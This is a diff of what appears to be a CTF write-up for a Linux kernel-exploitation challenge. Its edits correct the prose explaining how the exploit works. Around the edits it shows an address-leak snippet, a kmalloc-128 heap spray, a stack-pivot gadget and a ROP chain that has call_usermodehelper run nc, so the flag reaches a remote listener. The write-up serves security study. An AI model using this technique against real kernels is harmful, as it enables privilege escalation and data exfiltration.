@@ -249,7 +249,7 @@ __attribute__((naked)) void nkrcu_pivot(void)
 9:  48 8b 47 10   mov 0x10(%rdi),%rax         ; desc-&gt;ops
 12: 48 8b 00      mov (%rax),%rax             ; ops-&gt;validate
 1a: e9 ...        jmp __x86_indirect_thunk_rax</code></pre>
-          <p>The three NULL checks are everything the fake object has to satisfy — a non-NULL <code>ops</code> and a non-NULL <code>ops-&gt;validate</code>.</p>
+          <p>Two of those checks are everything the fake object has to satisfy — a non-NULL <code>ops</code> and a non-NULL <code>ops-&gt;validate</code>. The third is fixed by construction.</p>
           <p>One comment carries more weight than it looks:</p>
           <pre><code>/* workqueue context; validate callback may sleep */</code></pre>
           <p>Process context is what makes <code>call_usermodehelper(..., UMH_WAIT_PROC)</code> legal at the end of the chain — from a timer softirq it would not be.</p>
@@ -316,7 +316,7 @@ kernel_fn = u64(resp, 24)   # &amp;_printk
 pivot_fn  = u64(resp, 32)   # &amp;nkrcu_pivot
 
 kernel_base = kernel_fn - PRINTK_OFF</code></pre>
-          <p>One read yields three bases — kernel <code>_text</code>, the module's <code>.text</code>, and the module's <code>.rodata</code> through <code>ops</code>. Module base is randomized separately from <code>_text</code>, so <code>pivot_fn</code> has to be leaked, not computed.</p>
+          <p>One read yields two independently randomized bases and three useful pointers — kernel <code>_text</code>, and the module region through both <code>pivot_fn</code> and <code>ops</code>. Module base is randomized separately from <code>_text</code>, so <code>pivot_fn</code> has to be leaked, not computed.</p>
           <p><code>CMD_SPRAY_A</code> allocates 128 bytes with <code>GFP_ATOMIC</code> and copies 128 attacker bytes in — the same <code>kmalloc-128</code> cache as <code>struct nk_desc</code>. <code>CONFIG_MEMCG</code> is off, so there is no <code>kmalloc-cg-128</code> split.</p>
           <p>The ROP payload is self-referential: <code>argv</code> points at <code>rop_kaddr + 80</code>, and the <code>argv[]</code> entries live in the same buffer. But <code>CMD_SPRAY_A</code> copies the content before it reveals the address. The way out is a probe — allocate zeroes to learn an address, free it, re-allocate with content written for that address:</p>
           <pre><code>for attempt in range(1, 32):
@@ -357,7 +357,10 @@ jmp __x86_indirect_thunk_rax                     ; rdi still = desc_kaddr
 nkrcu_pivot:  mov (%rdi),%rsp                    ; rsp = rop_kaddr
               ret                                ; first ROP entry</code></pre>
           <p>The tail jump means no argument shuffling. The pivot replaces <code>rsp</code> wholesale, abandoning the kworker stack.</p>
-          <p>What it lands on is a 128-byte slab object. <code>call_usermodehelper</code> then blocks in <code>UMH_WAIT_PROC</code> for the lifetime of <code>nc</code>, with its frames growing down past <code>rop_kaddr</code> into whatever neighbours it. That is survivable only because the box is about to panic anyway.</p>
+          <p>What it lands on is a 128-byte slab object. <code>call_usermodehelper</code> then blocks in <code>UMH_WAIT_PROC</code> for the lifetime of <code>nc</code>, with its frames growing down past <code>rop_kaddr</code> into whatever neighbours it.</p>
+          <p>It survives because of the direction the freelist handed addresses out. The ROP object is the lowest of the three — <code>rop_kaddr</code>, then the strings, then the descriptor.</p>
+          <p>So <code>argv[]</code>, the paths and the fake object all sit above <code>rsp</code> and are never touched. The frames descend onto unrelated objects that nothing in an idle guest reads.</p>
+          <p>Had the spray gone the other way, the kworker would have smashed the <code>argv</code> strings before the helper copied them. A run that needs several attempts also leaves freed <code>kmalloc-128</code> objects in exactly that region.</p>
           <pre><code>#!/usr/bin/env python3
 # NEPHILIM | DefCamp CTF 2026 | Kernel pwn | Insane
 #
@@ -681,7 +684,7 @@ if __name__ == "__main__":
           <p>The exploit never sees the flag — it arrives on the listener:</p>
           <pre><code>Connection received on 172.17.0.2 47352
 CTF{&lt;64 hex chars&gt;}</code></pre>
-          <p>Then <code>call_usermodehelper</code> returns, the final <code>ret</code> loads zero from <code>rop_kaddr+72</code>, and the box panics. Excerpted from an earlier boot, against an earlier kernel build, so both the addresses and the build counter differ from the run above:</p>
+          <p>Then <code>call_usermodehelper</code> returns, the final <code>ret</code> loads zero from <code>rop_kaddr+72</code>, and the box panics. Excerpted from an earlier boot, against an earlier kernel build than the one shipped, so the addresses differ from the run above:</p>
           <pre><code>[   19.591444] BUG: kernel NULL pointer dereference, address: 0000000000000000
 [   19.591459] #PF: supervisor instruction fetch in kernel mode
 [   19.591459] CPU: 0 PID: 40 Comm: kworker/0:2 Tainted: G           O       6.1.184 #1
